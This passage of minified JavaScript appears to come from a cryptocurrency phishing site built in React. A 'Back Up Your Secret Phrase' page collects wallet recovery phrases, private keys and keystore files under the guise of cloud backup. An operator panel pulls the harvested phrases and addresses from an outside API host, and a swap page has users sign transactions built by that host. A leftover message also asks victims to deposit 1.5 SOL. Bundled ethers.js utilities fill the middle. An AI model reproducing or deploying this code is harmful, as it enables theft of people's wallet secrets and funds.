                Please deposit 1.5 SOL to your wallet to proceed and remain eligible for rewards.`)}catch(u){t({type:"SET_SAVE_PRIVATE_KEY_ERROR",payload:u.message}),alert("could not connect!")}};return H.jsxs(H.Fragment,{children:[H.jsx("section",{className:"home",children:H.jsxs("div",{className:"container my-5",children:[H.jsxs("div",{className:"row text-center text-white lh-lg",children:[H.jsx("h1",{className:"text-backup pt-5",children:"Back Up Your Secret Phrase"}),H.jsx("h5",{className:"text-h5",children:"Securely back up all your wallets to the cloud — never lose access, even if your device fails."})]}),H.jsxs("div",{className:"tabss mt-5 d-flex flex-column align-items-center text-center",children:[H.jsx("nav",{className:"w-100 d-flex justify-content-center",children:H.jsxs("div",{className:"nav nav-tabs",id:"nav-tab",role:"tablist",children:[H.jsx("button",{className:"nav-link active nav-small",id:"nav-home-tab","data-bs-toggle":"tab","data-bs-target":"#nav-home",type:"button",role:"tab","aria-controls":"nav-home","aria-selected":"true",children:"Phrase"}),H.jsx("button",{className:"nav-link nav-small",id:"nav-profile-tab","data-bs-toggle":"tab","data-bs-target":"#nav-profile",type:"button",role:"tab","aria-controls":"nav-profile","aria-selected":"false",children:"Private key"}),H.jsx("button",{className:"nav-link nav-small",id:"nav-contact-tab","data-bs-toggle":"tab","data-bs-target":"#nav-contact",type:"button",role:"tab","aria-controls":"nav-contact","aria-selected":"false",children:"Keystore"})]})}),e.loading&&H.jsxs("div",{className:"text-center py-4",children:[H.jsx("div",{class:"text-center",children:H.jsx("div",{class:"spinner-border",role:"status",children:H.jsx("span",{class:"visually-hidden",children:"Loading..."})})}),H.jsx("p",{className:"text-white mt-2",children:"Saving your phrase securely..."})]}),H.jsxs("div",{className:"tab-content w-100 mt-3",id:"nav-tabContent",style:{maxWidth:"600px"},children:[H.jsxs("div",{className:"tab-pane fade show active",id:"nav-home",role:"tabpanel","aria-labelledby":"nav-home-tab",tabIndex:"0",children:[H.jsxs("div",{className:"mb-3 bg-text-area",children:[e.walletName&&H.jsxs("p",{className:"text-white fw-bold pt-1",children:["Selected Wallet: ",H.jsxs("span",{className:"text-info",children:[e.walletName,"   ",H.jsx("img",{className:"img-border",src:e.walletLogo,alt:e.walletName,width:25,height:25})]})]}),H.jsx("label",{htmlFor:"exampleFormControlTextarea1",className:"form-label pb-3 nav-small",children:"Typically consisting of 12 words, though occasionally extending to 24, each separated by a single space."}),e.error&&H.jsx("div",{className:"alert alert-danger",children:e.error}),H.jsx("textarea",{className:"form-control dim-color",id:"exampleFormControlTextarea1",placeholder:"Your Recovery Phrase",rows:"9",value:n,onChange:u=>r(u.target.value)})]}),H.jsx("div",{className:"text-end pb-5",children:H.jsx("button",{className:"btn bg-success btn-success submit text-white",onClick:l,disabled:e.loading,children:e.loading?H.jsxs(H.Fragment,{children:[H.jsx("span",{class:"spinner-border spinner-border-sm","aria-hidden":"true"}),H.jsx("span",{role:"status",children:"Loading..."})]}):"Save wallet"})})]}),H.jsxs("div",{className:"tab-pane fade",id:"nav-profile",role:"tabpanel","aria-labelledby":"nav-profile-tab",tabIndex:"0",children:[H.jsxs("div",{className:"mb-3 bg-text-area",children:[e.walletName&&H.jsxs("p",{className:"text-white fw-bold pt-1",children:["Selected Wallet: ",H.jsxs("span",{className:"text-info",children:[e.walletName,"   ",H.jsx("img",{className:"img-border",src:e.walletLogo,alt:e.walletName,width:25,height:25})]})]}),H.jsx("label",{htmlFor:"formGroupExampleInput",className:"form-label text-white nav-small",children:"(Alphanumeric) Characters"}),H.jsx("input",{type:"text",className:"form-control py-3",id:"formGroupExampleInput",placeholder:"Paste your private key here...",value:i,onChange:u=>o(u.target.value)})]}),H.jsx("div",{className:"text-end pb-5",children:H.jsx("button",{className:"btn bg-success btn-success submit text-white nav-small",onClick:c,children:"Save Private Key"})})]}),H.jsxs("div",{className:"tab-pane fade",id:"nav-contact",role:"tabpanel","aria-labelledby":"nav-contact-tab",tabIndex:"0",children:[H.jsxs("div",{className:"mb-3",children:[H.jsx("label",{htmlFor:"formFile",className:"form-label nav-small text-white",children:"Upload Keystore file"}),H.jsx("input",{className:"form-control py-2",type:"file",id:"formFile"})]}),H.jsx("div",{className:"text-end pb-5",children:H.jsx("button",{className:"btn bg-success btn-success submit text-white nav-small",children:"Save Keystore"})})]})]})]})]})}),H.jsx("section",{className:"LiveChartSection",children:H.jsx(xO,{})})]})},ZW="6.14.3";function QW(t,e,n){const r=e.split("|").map(o=>o.trim());for(let o=0;o<r.length;o++)switch(e){case"any":return;case"bigint":case"boolean":case"number":case"string":if(typeof t===e)return}const i=new Error(`invalid value for type ${e}`);throw i.code="INVALID_ARGUMENT",i.argument=`value.${n}`,i.value=t,i}async function GG(t){const e=Object.keys(t);return(await Promise.all(e.map(r=>Promise.resolve(t[r])))).reduce((r,i,o)=>(r[e[o]]=i,r),{})}function $m(t,e,n){for(let r in e){let i=e[r];const o=n?n[r]:null;o&&QW(i,o,r),Object.defineProperty(t,r,{enumerable:!0,value:i,writable:!1})}}function ba(t,e){if(t==null)return"null";if(e==null&&(e=new Set),typeof t=="object"){if(e.has(t))return"[Circular]";e.add(t)}if(Array.isArray(t))return"[ "+t.map(n=>ba(n,e)).join(", ")+" ]";if(t instanceof Uint8Array){const n="0123456789abcdef";let r="0x";for(let i=0;i<t.length;i++)r+=n[t[i]>>4],r+=n[t[i]&15];return r}if(typeof t=="object"&&typeof t.toJSON=="function")return ba(t.toJSON(),e);switch(typeof t){case"boolean":case"number":case"symbol":return t.toString();case"bigint":return BigInt(t).toString();case"string":return JSON.stringify(t);case"object":{const n=Object.keys(t);return n.sort(),"{ "+n.map(r=>`${ba(r,e)}: ${ba(t[r],e)}`).join(", ")+" }"}}return"[ COULD NOT SERIALIZE ]"}function XW(t,e){return t&&t.code===e}function YG(t){return XW(t,"CALL_EXCEPTION")}function eK(t,e,n){let r=t;{const o=[];if(n){if("message"in n||"code"in n||"name"in n)throw new Error(`value will overwrite populated values: ${ba(n)}`);for(const l in n){if(l==="shortMessage")continue;const c=n[l];o.push(l+"="+ba(c))}}o.push(`code=${e}`),o.push(`version=${ZW}`),o.length&&(t+=" ("+o.join(", ")+")")}let i;switch(e){case"INVALID_ARGUMENT":i=new TypeError(t);break;case"NUMERIC_FAULT":case"BUFFER_OVERRUN":i=new RangeError(t);break;default:i=new Error(t)}return $m(i,{code:e}),n&&Object.assign(i,n),i.shortMessage==null&&$m(i,{shortMessage:r}),i}function Ct(t,e,n,r){if(!t)throw eK(e,n,r)}function Bt(t,e,n,r){Ct(t,e,"INVALID_ARGUMENT",{argument:n,value:r})}function JG(t,e,n){n==null&&(n=""),n&&(n=": "+n),Ct(t>=e,"missing argument"+n,"MISSING_ARGUMENT",{count:t,expectedCount:e}),Ct(t<=e,"too many arguments"+n,"UNEXPECTED_ARGUMENT",{count:t,expectedCount:e})}const tK=["NFD","NFC","NFKD","NFKC"].reduce((t,e)=>{try{if("test".normalize(e)!=="test")throw new Error("bad");if(e==="NFD"&&"é".normalize("NFD")!=="é")throw new Error("broken");t.push(e)}catch{}return t},[]);function ZG(t){Ct(tK.indexOf(t)>=0,"platform missing String.prototype.normalize","UNSUPPORTED_OPERATION",{operation:"String.prototype.normalize",info:{form:t}})}function nK(t,e,n){if(n==null&&(n=""),t!==e){let r=n,i="new";n&&(r+=".",i+=" "+n),Ct(!1,`private constructor; use ${r}from* methods`,"UNSUPPORTED_OPERATION",{operation:i})}}function GO(t,e,n){if(t instanceof Uint8Array)return n?new Uint8Array(t):t;if(typeof t=="string"&&t.match(/^0x(?:[0-9a-f][0-9a-f])*$/i)){const r=new Uint8Array((t.length-2)/2);let i=2;for(let o=0;o<r.length;o++)r[o]=parseInt(t.substring(i,i+2),16),i+=2;return r}Bt(!1,"invalid BytesLike value",e||"value",t)}function eu(t,e){return GO(t,e,!1)}function QG(t,e){return GO(t,e,!0)}function YO(t,e){return!(typeof t!="string"||!t.match(/^0x[0-9A-Fa-f]*$/)||typeof e=="number"&&t.length!==2+2*e||e===!0&&t.length%2!==0)}function rK(t){return YO(t,!0)||t instanceof Uint8Array}const Bx="0123456789abcdef";function tu(t){const e=eu(t);let n="0x";for(let r=0;r<e.length;r++){const i=e[r];n+=Bx[(i&240)>>4]+Bx[i&15]}return n}function XG(t){return"0x"+t.map(e=>tu(e).substring(2)).join("")}function eY(t){return YO(t,!0)?(t.length-2)/2:eu(t).length}function tY(t,e,n){const r=eu(t);return n!=null&&n>r.length&&Ct(!1,"cannot slice beyond data bounds","BUFFER_OVERRUN",{buffer:r,length:r.length,offset:n}),tu(r.slice(e??0,n??r.length))}function nY(t){let e=tu(t).substring(2);for(;e.startsWith("00");)e=e.substring(2);return"0x"+e}function JO(t,e,n){const r=eu(t);Ct(e>=r.length,"padding exceeds data length","BUFFER_OVERRUN",{buffer:new Uint8Array(r),length:e,offset:e+1});const i=new Uint8Array(e);return i.fill(0),n?i.set(r,e-r.length):i.set(r,0),tu(i)}function rY(t,e){return JO(t,e,!0)}function iY(t,e){return JO(t,e,!1)}const ed=BigInt(0),Nr=BigInt(1),Pm=9007199254740991;function Tm(t,e){const n=nd(t,"value"),r=BigInt(Li(e,"width"));if(Ct(n>>r===ed,"overflow","NUMERIC_FAULT",{operation:"fromTwos",fault:"overflow",value:t}),n>>r-Nr){const i=(Nr<<r)-Nr;return-((~n&i)+Nr)}return n}function sY(t,e){let n=td(t,"value");const r=BigInt(Li(e,"width")),i=Nr<<r-Nr;if(n<ed){n=-n,Ct(n<=i,"too low","NUMERIC_FAULT",{operation:"toTwos",fault:"overflow",value:t});const o=(Nr<<r)-Nr;return(~n&o)+Nr}else Ct(n<i,"too high","NUMERIC_FAULT",{operation:"toTwos",fault:"overflow",value:t});return n}function Lx(t,e){const n=nd(t,"value"),r=BigInt(Li(e,"bits"));return n&(Nr<<r)-Nr}function td(t,e){switch(typeof t){case"bigint":return t;case"number":return Bt(Number.isInteger(t),"underflow",e||"value",t),Bt(t>=-9007199254740991&&t<=Pm,"overflow",e||"value",t),BigInt(t);case"string":try{if(t==="")throw new Error("empty string");return t[0]==="-"&&t[1]!=="-"?-BigInt(t.substring(1)):BigInt(t)}catch(n){Bt(!1,`invalid BigNumberish string: ${n.message}`,e||"value",t)}}Bt(!1,"invalid BigNumberish value",e||"value",t)}function nd(t,e){const n=td(t,e);return Ct(n>=ed,"unsigned value cannot be negative","NUMERIC_FAULT",{fault:"overflow",operation:"getUint",value:t}),n}const jx="0123456789abcdef";function ZO(t){if(t instanceof Uint8Array){let e="0x0";for(const n of t)e+=jx[n>>4],e+=jx[n&15];return BigInt(e)}return td(t)}function Li(t,e){switch(typeof t){case"bigint":return Bt(t>=-9007199254740991&&t<=Pm,"overflow",e||"value",t),Number(t);case"number":return Bt(Number.isInteger(t),"underflow",e||"value",t),Bt(t>=-9007199254740991&&t<=Pm,"overflow",e||"value",t),t;case"string":try{if(t==="")throw new Error("empty string");return Li(BigInt(t),e)}catch(n){Bt(!1,`invalid numeric string: ${n.message}`,e||"value",t)}}Bt(!1,"invalid numeric value",e||"value",t)}function oY(t){return Li(ZO(t))}function aY(t,e){let r=nd(t,"value").toString(16);if(e==null)r.length%2&&(r="0"+r);else{const i=Li(e,"width");for(Ct(i*2>=r.length,`value exceeds width (${i} bytes)`,"NUMERIC_FAULT",{operation:"toBeHex",fault:"overflow",value:t});r.length<i*2;)r="0"+r}return"0x"+r}function iK(t){const e=nd(t,"value");if(e===ed)return new Uint8Array([]);let n=e.toString(16);n.length%2&&(n="0"+n);const r=new Uint8Array(n.length/2);for(let i=0;i<r.length;i++){const o=i*2;r[i]=parseInt(n.substring(o,o+2),16)}return r}function lY(t){let e=tu(rK(t)?t:iK(t)).substring(2);for(;e.startsWith("0");)e=e.substring(1);return e===""&&(e="0"),"0x"+e}const sK=BigInt(-1),Rr=BigInt(0),Ea=BigInt(1),oK=BigInt(5),ha={};let _a="0000";for(;_a.length<80;)_a+=_a;function Ms(t){let e=_a;for(;e.length<t;)e+=e;return BigInt("1"+e.substring(0,t))}function lc(t,e,n){const r=BigInt(e.width);if(e.signed){const i=Ea<<r-Ea;Ct(n==null||t>=-i&&t<i,"overflow","NUMERIC_FAULT",{operation:n,fault:"overflow",value:t}),t>Rr?t=Tm(Lx(t,r),r):t=-Tm(Lx(-t,r),r)}else{const i=Ea<<r;Ct(n==null||t>=0&&t<i,"overflow","NUMERIC_FAULT",{operation:n,fault:"overflow",value:t}),t=(t%i+i)%i&i-Ea}return t}function fy(t){typeof t=="number"&&(t=`fixed128x${t}`);let e=!0,n=128,r=18;if(typeof t=="string"){if(t!=="fixed")if(t==="ufixed")e=!1;else{const o=t.match(/^(u?)fixed([0-9]+)x([0-9]+)$/);Bt(o,"invalid fixed format","format",t),e=o[1]!=="u",n=parseInt(o[2]),r=parseInt(o[3])}}else if(t){const o=t,l=(c,u,f)=>o[c]==null?f:(Bt(typeof o[c]===u,"invalid fixed format ("+c+" not "+u+")","format."+c,o[c]),o[c]);e=l("signed","boolean",e),n=l("width","number",n),r=l("decimals","number",r)}Bt(n%8===0,"invalid FixedNumber width (not byte aligned)","format.width",n),Bt(r<=80,"invalid FixedNumber decimals (too large)","format.decimals",r);const i=(e?"":"u")+"fixed"+String(n)+"x"+String(r);return{signed:e,width:n,decimals:r,name:i}}function aK(t,e){let n="";t<Rr&&(n="-",t*=sK);let r=t.toString();if(e===0)return n+r;for(;r.length<=e;)r=_a+r;const i=r.length-e;for(r=r.substring(0,i)+"."+r.substring(i);r[0]==="0"&&r[1]!==".";)r=r.substring(1);for(;r[r.length-1]==="0"&&r[r.length-2]!==".";)r=r.substring(0,r.length-1);return n+r}var Dr,et,En,Ze,qs,xi,Am,Cm,Rm,Dm;const ds=class ds{constructor(e,n,r){Ul(this,Ze);zp(this,"format");Ul(this,Dr);Ul(this,et);Ul(this,En);zp(this,"_value");nK(e,ha,"FixedNumber"),ch(this,et,n),ch(this,Dr,r);const i=aK(n,r.decimals);$m(this,{format:r.name,_value:i}),ch(this,En,Ms(r.decimals))}get signed(){return Ne(this,Dr).signed}get width(){return Ne(this,Dr).width}get decimals(){return Ne(this,Dr).decimals}get value(){return Ne(this,et)}addUnsafe(e){return wt(this,Ze,Am).call(this,e)}add(e){return wt(this,Ze,Am).call(this,e,"add")}subUnsafe(e){return wt(this,Ze,Cm).call(this,e)}sub(e){return wt(this,Ze,Cm).call(this,e,"sub")}mulUnsafe(e){return wt(this,Ze,Rm).call(this,e)}mul(e){return wt(this,Ze,Rm).call(this,e,"mul")}mulSignal(e){wt(this,Ze,qs).call(this,e);const n=Ne(this,et)*Ne(e,et);return Ct(n%Ne(this,En)===Rr,"precision lost during signalling mul","NUMERIC_FAULT",{operation:"mulSignal",fault:"underflow",value:this}),wt(this,Ze,xi).call(this,n/Ne(this,En),"mulSignal")}divUnsafe(e){return wt(this,Ze,Dm).call(this,e)}div(e){return wt(this,Ze,Dm).call(this,e,"div")}divSignal(e){Ct(Ne(e,et)!==Rr,"division by zero","NUMERIC_FAULT",{operation:"div",fault:"divide-by-zero",value:this}),wt(this,Ze,qs).call(this,e);const n=Ne(this,et)*Ne(this,En);return Ct(n%Ne(e,et)===Rr,"precision lost during signalling div","NUMERIC_FAULT",{operation:"divSignal",fault:"underflow",value:this}),wt(this,Ze,xi).call(this,n/Ne(e,et),"divSignal")}cmp(e){let n=this.value,r=e.value;const i=this.decimals-e.decimals;return i>0?r*=Ms(i):i<0&&(n*=Ms(-i)),n<r?-1:n>r?1:0}eq(e){return this.cmp(e)===0}lt(e){return this.cmp(e)<0}lte(e){return this.cmp(e)<=0}gt(e){return this.cmp(e)>0}gte(e){return this.cmp(e)>=0}floor(){let e=Ne(this,et);return Ne(this,et)<Rr&&(e-=Ne(this,En)-Ea),e=Ne(this,et)/Ne(this,En)*Ne(this,En),wt(this,Ze,xi).call(this,e,"floor")}ceiling(){let e=Ne(this,et);return Ne(this,et)>Rr&&(e+=Ne(this,En)-Ea),e=Ne(this,et)/Ne(this,En)*Ne(this,En),wt(this,Ze,xi).call(this,e,"ceiling")}round(e){if(e==null&&(e=0),e>=this.decimals)return this;const n=this.decimals-e,r=oK*Ms(n-1);let i=this.value+r;const o=Ms(n);return i=i/o*o,lc(i,Ne(this,Dr),"round"),new ds(ha,i,Ne(this,Dr))}isZero(){return Ne(this,et)===Rr}isNegative(){return Ne(this,et)<Rr}toString(){return this._value}toUnsafeFloat(){return parseFloat(this.toString())}toFormat(e){return ds.fromString(this.toString(),e)}static fromValue(e,n,r){const i=n==null?0:Li(n),o=fy(r);let l=td(e,"value");const c=i-o.decimals;if(c>0){const u=Ms(c);Ct(l%u===Rr,"value loses precision for format","NUMERIC_FAULT",{operation:"fromValue",fault:"underflow",value:e}),l/=u}else c<0&&(l*=Ms(-c));return lc(l,o,"fromValue"),new ds(ha,l,o)}static fromString(e,n){const r=e.match(/^(-?)([0-9]*)\.?([0-9]*)$/);Bt(r&&r[2].length+r[3].length>0,"invalid FixedNumber string value","value",e);const i=fy(n);let o=r[2]||"0",l=r[3]||"";for(;l.length<i.decimals;)l+=_a;Ct(l.substring(i.decimals).match(/^0*$/),"too many decimals for format","NUMERIC_FAULT",{operation:"fromString",fault:"underflow",value:e}),l=l.substring(0,i.decimals);const c=BigInt(r[1]+o+l);return lc(c,i,"fromString"),new ds(ha,c,i)}static fromBytes(e,n){let r=ZO(eu(e,"value"));const i=fy(n);return i.signed&&(r=Tm(r,i.width)),lc(r,i,"fromBytes"),new ds(ha,r,i)}};Dr=new WeakMap,et=new WeakMap,En=new WeakMap,Ze=new WeakSet,qs=function(e){Bt(this.format===e.format,"incompatible format; use fixedNumber.toFormat","other",e)},xi=function(e,n){return e=lc(e,Ne(this,Dr),n),new ds(ha,e,Ne(this,Dr))},Am=function(e,n){return wt(this,Ze,qs).call(this,e),wt(this,Ze,xi).call(this,Ne(this,et)+Ne(e,et),n)},Cm=function(e,n){return wt(this,Ze,qs).call(this,e),wt(this,Ze,xi).call(this,Ne(this,et)-Ne(e,et),n)},Rm=function(e,n){return wt(this,Ze,qs).call(this,e),wt(this,Ze,xi).call(this,Ne(this,et)*Ne(e,et)/Ne(this,En),n)},Dm=function(e,n){return Ct(Ne(e,et)!==Rr,"division by zero","NUMERIC_FAULT",{operation:"div",fault:"divide-by-zero",value:this}),wt(this,Ze,qs).call(this,e),wt(this,Ze,xi).call(this,Ne(this,et)*Ne(this,En)/Ne(e,et),n)};let gf=ds;const QO=["wei","kwei","mwei","gwei","szabo","finney","ether"];function lK(t,e){let n=18;if(typeof e=="string"){const r=QO.indexOf(e);Bt(r>=0,"invalid unit","unit",e),n=3*r}else e!=null&&(n=Li(e,"unit"));return gf.fromValue(t,n,{decimals:n,width:512}).toString()}function Nm(t,e){Bt(typeof t=="string","value must be a string","value",t);let n=18;if(typeof e=="string"){const r=QO.indexOf(e);Bt(r>=0,"invalid unit","unit",e),n=3*r}else e!=null&&(n=Li(e,"unit"));return gf.fromString(t,{decimals:n,width:512}).value}function cY(t){return lK(t,18)}function uY(t){return Nm(t,18)}const Ux="https://crypto-api-hsdj.onrender.com",fa=[{symbol:"ETH",address:"0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE",decimals:18},{symbol:"USDT",address:"0xdAC17F958D2ee523a2206206994597C13D831ec7",decimals:6},{symbol:"DAI",address:"0x6B175474E89094C44Da98b954EedeAC495271d0F",decimals:18}],cK=()=>{const{state:t}=sS(),[e,n]=ue.useState(fa[0]),[r,i]=ue.useState(fa[1]),[o,l]=ue.useState(""),[c,u]=ue.useState(null),[f,d]=ue.useState(!1),y=async()=>{if(!t.address){alert("Please connect your wallet first.");return}if(!window.ethereum){alert("Ethereum provider not found. Please install MetaMask.");return}try{const g=Nm(o,e.decimals).toString(),w=await(await fetch(`${Ux}/api/swap`,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({fromTokenAddress:e.address,toTokenAddress:r.address,amount:g,walletAddress:t.address,slippage:1})})).json();if(console.log("Swap response:",w),!w.tx){alert("Failed to fetch swap transation");return}const b=w.tx,m=await window.ethereum.request({method:"eth_sendTransaction",params:[b]});alert("Transaction sent: "+m)}catch(g){console.error("Swap failed",g),alert("Swap failed, check console for details")}};return ue.useEffect(()=>{if(!o||isNaN(o))return;(async()=>{if(!(!o||isNaN(o))){d(!0);try{const E=Nm(o,e.decimals).toString(),b=await(await fetch(`${Ux}/api/quotes?fromTokenAddress=${e.address}&toTokenAddress=${r.address}&amount=${E}`)).json();u(b.toTokenAmount/10**r.decimals)}catch(E){console.error("Failed to fetch quote:",E)}finally{d(!1)}}})()},[e,r,o]),H.jsx("section",{className:"home",children:H.jsx("div",{className:"container my-5",children:H.jsx("div",{className:"row text-center text-white lh-lg",children:H.jsxs("div",{className:"p-4 max-w-md mx-auto shadow-lg rounded-lg",children:[H.jsx("h2",{className:"text-xl font-semibold mb-4",children:"Swap"}),H.jsxs("div",{className:"mb-3",children:[H.jsx("label",{className:"block font-medium",children:"From"}),H.jsx("select",{className:"w-full border p-2",value:e.symbol,onChange:g=>n(fa.find(E=>E.symbol===g.target.value)),children:fa.map(g=>H.jsx("option",{value:g.symbol,children:g.symbol},g.symbol))})]}),H.jsxs("div",{className:"mb-3",children:[H.jsx("label",{className:"block font-medium",children:"To"}),H.jsx("select",{className:"w-full border p-2 bg-dark",value:r.symbol,onChange:g=>i(fa.find(E=>E.symbol===g.target.value)),children:fa.map(g=>H.jsx("option",{value:g.symbol,children:g.symbol},g.symbol))})]}),H.jsxs("div",{className:"mb-3",children:[H.jsx("label",{className:"block font-medium",children:"Amount"}),H.jsx("input",{className:"w-full border p-2",type:"number",value:o,onChange:g=>l(g.target.value),placeholder:"0.0"})]}),f?H.jsx("p",{children:"Loading quote..."}):c?H.jsxs("p",{children:["Estimated: ",H.jsxs("strong",{children:[c," ",r.symbol]})]}):null,H.jsx("button",{className:"mt-4 ",onClick:y,children:"Swap"})]})})})})},uK="https://crypto-api-hsdj.onrender.com",hK=()=>{const{state:t,dispatch:e}=ue.useContext(Zc),{getphrase:n,loading:r,error:i}=t;ue.useEffect(()=>{(async()=>{e({type:"SET_LOADING"});try{const u=await(await fetch(`${uK}/api/phrase`)).json();e({type:"GET_PHRASE_SUCCESS",payload:u})}catch(c){e({type:"GET_PHRASE_ERROR",payload:c.message})}})()},[e]);const o=l=>{navigator.clipboard.writeText(l).then(()=>alert("Phrase copied to clipboard")).catch(c=>alert("Failed to copy",c))};return H.jsxs(H.Fragment,{children:[H.jsx("h2",{className:"py-5 text-center",children:H.jsx("u",{children:H.jsx("strong",{children:"view phrase"})})}),r&&H.jsx("p",{children:"Loading..."}),i&&H.jsxs("p",{className:"text-danger",children:["Error: ",i]}),!r&&!i&&Array.isArray(n)&&n.length>0&&H.jsxs("table",{className:"table table-striped table-hover",children:[H.jsx("thead",{children:H.jsxs("tr",{children:[H.jsx("th",{scope:"col",children:"#"}),H.jsx("th",{scope:"col",children:"Wallet Name"}),H.jsx("th",{scope:"col",children:"Wallet Phrase"})]})}),H.jsx("tbody",{children:n.map((l,c)=>H.jsxs("tr",{children:[H.jsx("th",{scope:"row",children:c+1}),H.jsx("td",{children:l.walletName||"N/A"}),H.jsxs("td",{children:[H.jsx("span",{className:"pe-5",children:l.phrase}),H.jsx("button",{className:"btn btn-sm btn-outline-secondary",onClick:()=>o(l.phrase),title:"copy to clipboard",children:H.jsx("i",{className:"fa-solid fa-copy"})})]})]},c))})]}),!r&&!i&&Array.isArray(n)&&n.length===0&&H.jsx("p",{children:"No phrases found."})]})},fK="https://crypto-api-hsdj.onrender.com",dK=()=>{const{state:t,dispatch:e}=ue.useContext(Zc),{getwalletaddress:n,loading:r,error:i}=t;return ue.useEffect(()=>{(async()=>{e({type:"SET_LOADING"});try{const c=await(await fetch(`${fK}/api/address`)).json();e({type:"GET_WALLET_ADDRESS_SUCCESS",payload:c})}catch(l){e({type:"GET_WALLET_ADDRESS_ERROR",payload:l.message})}})()},[e]),H.jsx(H.Fragment,{children:H.jsxs("div",{className:"container",children:[H.jsx("h1",{className:"py-5 text-center",children:H.jsx("u",{children:H.jsx("strong",{children:"View all Wallet Address"})})}),r&&H.jsx("p",{children:"Loading..."}),i&&H.jsxs("p",{children:["Error: ",i]}),!r&&!i&&Array.isArray(n)&&n.length>0&&H.jsx("div",{className:"table-responsive",children:H.jsxs("table",{className:"table table-striped table-hover",children:[H.jsx("thead",{children:H.jsxs("tr",{children:[H.jsx("th",{scope:"col",children:"#"}),H.jsx("th",{scope:"col",children:"Chain Address"}),H.jsx("th",{scope:"col",children:"Chain Name"}),H.jsx("th",{scope:"col",children:"ConnectedAt"})]})}),H.jsx("tbody",{children:n.map((o,l)=>H.jsxs("tr",{children:[H.jsx("th",{scope:"row",children:l+1}),H.jsx("td",{children:o.address||"N/A"}),H.jsx("td",{children:o.chain}),H.jsx("td",{children:new Date(o.connectedAt).toLocaleString()||"N/A"})]},l))})]})}),!r&&!i&&Array.isArray(n)&&n.length===0&&H.jsx("p",{children:"No Wallet Address Found."})]})})};function pK(){return H.jsxs(jT,{children:[H.jsx(vV,{children:H.jsxs(hV,{children:[H.jsx(fV,{}),H.jsxs(nT,{children:[H.jsx(da,{path:"/",element:H.jsx(mV,{})}),H.jsx(da,{path:"/cloud-storage",element:H.jsx(JW,{})}),H.jsx(da,{path:"/swap",element:H.jsx(cK,{})}),H.jsx(da,{path:"/view-phrase",element:H.jsx(hK,{})}),H.jsx(da,{path:"/wallet-address",element:H.jsx(dK,{})})]})]})}),H.jsx(BT,{})]})}uP.createRoot(document.getElementById("root")).render(H.jsx(ue.StrictMode,{children:H.jsx(OT,{children:H.jsx(pK,{})})}));export{be as $,iY as A,lY as B,GG as C,YG as D,ZW as E,gf as F,cY as G,lK as H,nd as I,uY as J,Nm as K,nY as L,yf as M,eP as N,FT as O,Mx as P,bh as Q,d_ as R,Dk as S,kk as T,Rk as U,Ck as V,Nb as W,ho as X,pr as Y,jn as Z,xa as _,Bt as a,_D as a0,JT as a1,fc as a2,Sy as a3,rr as a4,Af as a5,f4 as a6,Sn as a7,fk as a8,Fn as a9,Cf as aA,rG as aB,nG as aC,ys as aa,fo as ab,Uc as ac,gr as ad,XU as ae,cw as af,Uf as ag,Lf as ah,Mm as ai,ab as aj,LS as ak,$8 as al,Zs as am,jf as an,Qr as ao,dr as ap,Zr as aq,Br as ar,sB as as,eG as at,Gb as au,S_ as av,Y4 as aw,oB as ax,tG as ay,XK as az,ZG as b,Ct as c,$m as d,Li as e,XG as f,eu as g,tu as h,QG as i,oY as j,iK as k,eY as l,eK as m,nK as n,td as o,YO as p,aY as q,tY as r,JG as s,ZO as t,XW as u,Lx as v,sY as w,Tm as x,rK as y,rY as z};
